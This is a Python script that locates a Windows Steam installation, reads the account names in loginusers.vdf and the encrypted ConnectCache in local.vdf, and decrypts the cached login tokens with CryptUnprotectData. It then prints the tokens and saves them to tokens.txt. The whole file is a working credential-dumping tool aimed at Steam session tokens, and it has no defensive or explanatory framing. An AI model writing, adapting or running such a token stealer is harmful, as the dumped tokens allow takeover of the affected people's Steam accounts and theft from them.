import os
import vdf
import binascii
import win32crypt
import zlib
import jwt

def dump():
    steam_paths = [
        'C:\\Program Files (x86)\\Steam',
        'C:\\Program Files\\Steam',
        os.path.expandvars('%ProgramFiles(x86)%\\Steam'),
    ]
    
    steamdir = None
    for p in steam_paths:
        if os.path.exists(os.path.join(p, 'steam.exe')):
            steamdir = p
            break
    
    if not steamdir:
        print("[-] Steam not found")
        return []

    loginusers_file = os.path.join(steamdir, 'config', 'loginusers.vdf')
    accounts = {}
    
    if os.path.exists(loginusers_file):
        with open(loginusers_file, 'r', encoding='utf8', errors='ignore') as f:
            data = vdf.load(f)
        
        users = data.get('users', data.get('Users', {}))
        for sid, info in users.items():
            login = info.get('AccountName', info.get('accountname', ''))
            persona = info.get('PersonaName', info.get('personaname', ''))
            if login:
                accounts[login] = {
                    'steamid': sid,
                    'persona': persona,
                    'login': login
                }
                print(f"[*] Account: '{login}' (SteamID: {sid})")

    if not accounts:
        print("[-] No accounts found")
        return []

    print(f"[+] Found {len(accounts)} account(s)")

    local_file = os.path.join(os.getenv('LOCALAPPDATA'), 'steam', 'local.vdf')
    
    if not os.path.exists(local_file):
        print("[-] local.vdf not found")
        return []

    with open(local_file, 'r', encoding='utf8', errors='ignore') as f:
        local_data = vdf.load(f)

    try:
        connect_cache = local_data['MachineUserConfigStore']['Software']['Valve']['Steam']['ConnectCache']
    except KeyError:
        print("[-] ConnectCache not found")
        return []

    print(f"[+] ConnectCache keys: {list(connect_cache.keys())}")

    results = []

    for login, acc_info in accounts.items():
        hdr = hex(zlib.crc32(login.encode()) & 0xFFFFFFFF).replace('0x', '') + '1'
        print(f"[*] Looking for key '{hdr}' for login '{login}'")

        if hdr not in connect_cache:
            print(f"[-] No cached token for '{login}'")
            continue

        encrypted_hex = connect_cache[hdr]

        try:
            encrypted_bytes = binascii.unhexlify(encrypted_hex)
            
            # CryptUnprotectData(DataIn, OptionalEntropy, Reserved, PromptStruct, Flags)
            desc, token_bytes = win32crypt.CryptUnprotectData(
                encrypted_bytes,       # DataIn
                login.encode(),        # OptionalEntropy
                None,                  # Reserved
                None,                  # PromptStruct (NOT 0, must be None)
                0                      # Flags
            )
            
            token_str = token_bytes.decode('utf-8')
            full_token = f"{login}.{token_str}"

            try:
                payload = jwt.decode(token_str, options={'verify_signature': False})
                steamid = payload.get('sub', 'unknown')
            except:
                steamid = acc_info['steamid']

            results.append({
                'login': login,
                'persona': acc_info['persona'],
                'steamid': steamid,
                'token': full_token,
            })

            print(f"\n[+] === {login} ===")
            print(f"    Persona:  {acc_info['persona']}")
            print(f"    SteamID:  {steamid}")
            print(f"    Token:    {full_token[:80]}...")

        except Exception as e:
            print(f"[-] Failed for '{login}': {type(e).__name__}: {e}")

    print(f"\n[+] Dumped {len(results)}/{len(accounts)} token(s)")
    
    if results:
        out_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tokens.txt')
        with open(out_file, 'w', encoding='utf-8') as f:
            for r in results:
                f.write(f"{r['token']}\n")
        print(f"[+] Saved to {out_file}")
    
    return results


if __name__ == '__main__':
    dump()